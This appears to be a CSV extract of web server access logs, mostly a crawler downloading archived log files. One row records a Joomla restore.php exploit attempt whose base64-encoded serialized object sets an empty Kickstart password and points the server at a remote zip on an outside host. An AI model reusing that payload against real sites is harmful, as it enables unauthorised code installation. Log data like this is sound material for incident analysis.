Log Format,Field 1,Field 2,Field 3,Field 4,Field 5,Field 6,Field 7
WSC,46.229.168.65,-,01/Jan/2017:10:42:24 -0800,GET /self.logs/access.log.2016-11-05.gz HTTP/1.1,200,5919
WSC,46.229.168.68,-,01/Jan/2017:10:42:47 -0800,GET /self.logs/error.log.2016-11-14.gz HTTP/1.1,200,651
WSC,46.229.168.65,-,01/Jan/2017:10:43:09 -0800,GET /self.logs/access.log.2016-07-12.gz HTTP/1.1,200,21366
WSC,46.229.168.69,-,01/Jan/2017:10:43:40 -0800,GET /self.logs/error.log.2016-06-16.gz HTTP/1.1,200,1068
WSC,46.229.168.66,-,01/Jan/2017:10:43:49 -0800,GET /self.logs/error.log.2016-09-12.gz HTTP/1.1,200,900
WSC,46.229.168.71,-,01/Jan/2017:10:44:05 -0800,GET /self.logs/error.log.2016-09-25.gz HTTP/1.1,200,1413
WSC,46.229.168.74,-,01/Jan/2017:10:44:25 -0800,GET /self.logs/error.log.2016-06-22.gz HTTP/1.1,200,908
WSC,46.229.168.68,-,01/Jan/2017:10:44:43 -0800,GET /self.logs/error.log.2016-08-03.gz HTTP/1.1,200,1568
WSC,46.229.168.74,-,01/Jan/2017:10:45:06 -0800,GET /self.logs/access.log.2016-08-03.gz HTTP/1.1,200,12271
WSC,46.229.168.67,-,01/Jan/2017:10:45:42 -0800,GET /self.logs/access.log.2016-11-08.gz HTTP/1.1,200,8425
WSC,46.229.168.72,-,01/Jan/2017:10:45:44 -0800,GET /self.logs/access.log.2016-08-21.gz HTTP/1.1,200,7794
WSC,46.229.168.68,-,01/Jan/2017:10:46:03 -0800,GET /self.logs/error.log.2016-08-08.gz HTTP/1.1,200,892
WSC,46.229.168.70,-,01/Jan/2017:10:46:38 -0800,GET /self.logs/access.log.2016-09-25.gz HTTP/1.1,200,7095
WSC,46.229.168.69,-,01/Jan/2017:10:46:39 -0800,GET /self.logs/access.log.2016-09-14.gz HTTP/1.1,200,8588
WSC,46.229.168.70,-,01/Jan/2017:10:46:42 -0800,GET /self.logs/access.log.2016-09-25.gz HTTP/1.1,200,7095
WSC,46.229.168.66,-,01/Jan/2017:10:46:59 -0800,GET /self.logs/error.log.2016-07-22.gz HTTP/1.1,200,1309
WSC,46.229.168.65,-,01/Jan/2017:10:47:16 -0800,GET /self.logs/access.log.2016-08-13.gz HTTP/1.1,200,8471
WSC,46.229.168.68,-,01/Jan/2017:10:47:50 -0800,GET /self.logs/error.log.2016-11-01.gz HTTP/1.1,200,833
WSC,46.229.168.66,-,01/Jan/2017:10:47:54 -0800,GET /self.logs/access.log.2016-07-16.gz HTTP/1.1,200,8656
WSC,46.229.168.70,-,01/Jan/2017:10:48:39 -0800,GET /self.logs/access.log.2016-08-06.gz HTTP/1.1,200,18488
WSC,46.229.168.70,-,01/Jan/2017:10:48:39 -0800,GET /self.logs/access.log.2016-08-06.gz HTTP/1.1,200,18488
WSC,46.229.168.66,-,01/Jan/2017:10:48:46 -0800,GET /self.logs/error.log.2016-07-09.gz HTTP/1.1,200,1028
WSC,46.229.168.73,-,01/Jan/2017:10:49:02 -0800,GET /self.logs/error.log.2016-07-21.gz HTTP/1.1,200,741
WSC,46.229.168.74,-,01/Jan/2017:10:49:28 -0800,GET /self.logs/access.log.2016-09-12.gz HTTP/1.1,200,12313
WSC,46.229.168.73,-,01/Jan/2017:10:49:59 -0800,GET /self.logs/access.log.2016-11-04.gz HTTP/1.1,200,9334
WSC,46.229.168.68,-,01/Jan/2017:10:50:00 -0800,GET /self.logs/error.log.2016-10-09.gz HTTP/1.1,200,800
WSC,46.229.168.68,-,01/Jan/2017:10:50:09 -0800,GET /self.logs/error.log.2016-10-09.gz HTTP/1.1,200,800
WSC,46.229.168.65,-,01/Jan/2017:10:50:27 -0800,GET /self.logs/error.log.2016-08-25.gz HTTP/1.1,200,813
WSC,81.163.131.56,-,01/Jan/2017:10:50:30 -0800,GET /self.logs/administrator/components/com_joomlaupdate/restore.php?task=stepRestore&factory=Tzo5OiJBS0ZhY3RvcnkiOjE6e3M6MTg6IgBBS0ZhY3RvcnkAdmFybGlzdCI7YToyOntzOjI3OiJraWNrc3RhcnQuc2VjdXJpdHkucGFzc3dvcmQiO3M6MDoiIjtzOjI2OiJraWNrc3RhcnQuc2V0dXAuc291cmNlZmlsZSI7czo0NDoiaHR0cDovL2VjZWxsLm5pdHJrbC5hYy5pbi9pcGl6cG0vd3Q1Mjg5bi56aXAiO319 HTTP/1.1,404,239
WSC,46.229.168.68,-,01/Jan/2017:10:50:32 -0800,GET /self.logs/access.log.2016-07-02.gz HTTP/1.1,200,5624
WSC,46.229.168.71,-,01/Jan/2017:10:51:02 -0800,GET /self.logs/error.log.2016-07-23.gz HTTP/1.1,200,1325
WSC,46.229.168.71,-,01/Jan/2017:10:51:23 -0800,GET /self.logs/error.log.2016-11-09.gz HTTP/1.1,200,670
WSC,46.229.168.67,-,01/Jan/2017:10:51:56 -0800,GET /self.logs/error.log.2016-07-31.gz HTTP/1.1,200,1076
WSC,46.229.168.66,-,01/Jan/2017:10:52:00 -0800,GET /self.logs/error.log.2016-11-02.gz HTTP/1.1,200,835
WSC,46.229.168.71,-,01/Jan/2017:10:52:16 -0800,GET /self.logs/error.log.2016-08-07.gz HTTP/1.1,200,1817
WSC,46.229.168.72,-,01/Jan/2017:10:52:35 -0800,GET /self.logs/access.log.2016-06-29.gz HTTP/1.1,200,8637
WSC,46.229.168.71,-,01/Jan/2017:10:53:00 -0800,GET /self.logs/error.log.2016-08-29.gz HTTP/1.1,200,924
WSC,46.229.168.65,-,01/Jan/2017:10:53:15 -0800,GET /self.logs/access.log.2016-11-02.gz HTTP/1.1,200,9780
WSC,46.229.168.72,-,01/Jan/2017:10:53:55 -0800,GET /self.logs/access.log.2016-10-20.gz HTTP/1.1,200,8477
WSC,46.229.168.68,-,01/Jan/2017:10:53:58 -0800,GET /self.logs/error.log.2016-10-19.gz HTTP/1.1,200,520
WSC,46.229.168.68,-,01/Jan/2017:10:53:58 -0800,GET /self.logs/error.log.2016-10-19.gz HTTP/1.1,200,520
WSC,46.229.168.69,-,01/Jan/2017:10:54:17 -0800,GET /self.logs/error.log.2016-08-02.gz HTTP/1.1,200,1059
WSC,46.229.168.72,-,01/Jan/2017:10:54:34 -0800,GET /self.logs/access.log.2016-06-22.gz HTTP/1.1,200,13212
WSC,46.229.168.69,-,01/Jan/2017:10:55:00 -0800,GET /self.logs/access.log.2016-06-15.gz HTTP/1.1,200,10976
WSC,46.229.168.72,-,01/Jan/2017:10:55:09 -0800,GET /self.logs/access.log.2016-10-22.gz HTTP/1.1,200,6431
WSC,46.229.168.71,-,01/Jan/2017:10:55:31 -0800,GET /self.logs/error.log.2016-11-06.gz HTTP/1.1,200,1175
WSC,46.229.168.71,-,01/Jan/2017:10:55:51 -0800,GET /self.logs/error.log.2016-06-28.gz HTTP/1.1,200,1041
WSC,46.229.168.71,-,01/Jan/2017:10:56:09 -0800,GET /self.logs/error.log.2016-10-05.gz HTTP/1.1,200,547
WSC,46.229.168.74,-,01/Jan/2017:10:56:28 -0800,GET /self.logs/access.log.2016-10-25.gz HTTP/1.1,200,12863
WSC,46.229.168.69,-,01/Jan/2017:10:56:52 -0800,GET /self.logs/access.log.2016-09-11.gz HTTP/1.1,200,21811
WSC,46.229.168.70,-,01/Jan/2017:10:57:03 -0800,GET /self.logs/access.log.2016-06-24.gz HTTP/1.1,200,8801
WSC,46.229.168.68,-,01/Jan/2017:10:57:29 -0800,GET /self.logs/error.log.2016-07-08.gz HTTP/1.1,200,678
WSC,46.229.168.71,-,01/Jan/2017:10:57:42 -0800,GET /self.logs/error.log.2016-11-04.gz HTTP/1.1,200,924
WSC,46.229.168.66,-,01/Jan/2017:10:57:58 -0800,GET /self.logs/error.log.2016-09-19.gz HTTP/1.1,200,773
WSC,46.229.168.69,-,01/Jan/2017:10:58:21 -0800,GET /self.logs/error.log.2016-11-05.gz HTTP/1.1,200,776
WSC,46.229.168.67,-,01/Jan/2017:10:58:33 -0800,GET /self.logs/access.log.2016-10-05.gz HTTP/1.1,200,6296
WSC,46.229.168.70,-,01/Jan/2017:10:58:56 -0800,GET /self.logs/error.log.2016-11-12.gz HTTP/1.1,200,672
WSC,46.229.168.67,-,01/Jan/2017:10:59:19 -0800,GET /self.logs/error.log.2016-10-26.gz HTTP/1.1,200,819
WSC,46.229.168.68,-,01/Jan/2017:10:59:32 -0800,GET /self.logs/access.log.2016-08-31.gz HTTP/1.1,200,8508
WSC,46.229.168.74,-,01/Jan/2017:10:59:50 -0800,GET /self.logs/error.log.2016-08-16.gz HTTP/1.1,200,986
WSC,46.229.168.72,-,01/Jan/2017:11:00:06 -0800,GET /self.logs/error.log.2016-10-02.gz HTTP/1.1,200,1639
WSC,46.229.168.74,-,01/Jan/2017:11:00:26 -0800,GET /self.logs/error.log.2016-08-15.gz HTTP/1.1,200,647
WSC,46.229.168.65,-,01/Jan/2017:11:00:46 -0800,GET /self.logs/access.log.2016-10-30.gz HTTP/1.1,200,12610
WSC,46.229.168.68,-,01/Jan/2017:11:01:00 -0800,GET /self.logs/error.log.2016-06-29.gz HTTP/1.1,200,1141
WSC,46.229.168.73,-,01/Jan/2017:11:01:20 -0800,GET /self.logs/access.log.2016-06-20.gz HTTP/1.1,200,9938
WSC,46.229.168.68,-,01/Jan/2017:11:01:41 -0800,GET /self.logs/access.log.2016-09-20.gz HTTP/1.1,200,11130
WSC,46.229.168.73,-,01/Jan/2017:11:01:59 -0800,GET /self.logs/access.log.2016-07-07.gz HTTP/1.1,200,11226
WSC,46.229.168.67,-,01/Jan/2017:11:02:21 -0800,GET /self.logs/error.log.2016-10-14.gz HTTP/1.1,200,708
WSC,46.229.168.72,-,01/Jan/2017:11:02:37 -0800,GET /self.logs/access.log.2016-07-22.gz HTTP/1.1,200,8119
WSC,46.229.168.72,-,01/Jan/2017:11:02:53 -0800,GET /self.logs/error.log.2016-07-26.gz HTTP/1.1,200,853
WSC,46.229.168.74,-,01/Jan/2017:11:03:11 -0800,GET /self.logs/access.log.2016-07-15.gz HTTP/1.1,200,12181
WSC,46.229.168.73,-,01/Jan/2017:11:03:29 -0800,GET /self.logs/access.log.2016-07-11.gz HTTP/1.1,200,11488
WSC,46.229.168.74,-,01/Jan/2017:11:03:45 -0800,GET /self.logs/access.log.2016-07-21.gz HTTP/1.1,200,8374
WSC,46.229.168.67,-,01/Jan/2017:11:04:02 -0800,GET /self.logs/error.log.2016-10-15.gz HTTP/1.1,200,699
WSC,46.229.168.69,-,01/Jan/2017:11:04:25 -0800,GET /self.logs/access.log.2016-07-05.gz HTTP/1.1,200,21090
WSC,46.229.168.73,-,01/Jan/2017:11:04:38 -0800,GET /self.logs/error.log.2016-07-27.gz HTTP/1.1,200,937
WSC,46.229.168.70,-,01/Jan/2017:11:05:00 -0800,GET /self.logs/access.log.2016-10-28.gz HTTP/1.1,200,7296
WSC,46.229.168.67,-,01/Jan/2017:11:05:21 -0800,GET /self.logs/access.log.2016-07-29.gz HTTP/1.1,200,6770
WSC,46.229.168.70,-,01/Jan/2017:11:05:32 -0800,GET /self.logs/access.log.2016-11-07.gz HTTP/1.1,200,11419
WSC,46.229.168.67,-,01/Jan/2017:11:05:51 -0800,GET /self.logs/access.log.2016-06-30.gz HTTP/1.1,200,9198
WSC,68.180.228.229,-,01/Jan/2017:11:06:06 -0800,GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1,200,1141714
WSC,46.229.168.67,-,01/Jan/2017:11:06:12 -0800,GET /self.logs/access.log.2016-10-26.gz HTTP/1.1,200,11007
WSC,46.229.168.65,-,01/Jan/2017:11:06:26 -0800,GET /self.logs/access.log.2016-06-18.gz HTTP/1.1,200,7950
WSC,46.229.168.74,-,01/Jan/2017:11:06:51 -0800,GET /self.logs/access.log.2016-10-02.gz HTTP/1.1,200,9388
WSC,46.229.168.65,-,01/Jan/2017:11:07:05 -0800,GET /self.logs/access.log.2016-08-10.gz HTTP/1.1,200,5945
